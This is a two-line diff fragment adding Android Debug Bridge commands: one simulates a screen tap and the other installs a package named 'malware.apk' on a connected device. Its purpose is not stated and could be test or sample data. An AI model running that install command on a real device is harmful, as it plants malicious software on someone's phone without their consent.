@@ -1,0 +1,2 @@
+adb shell input tap 100 200
+adb install malware.apk
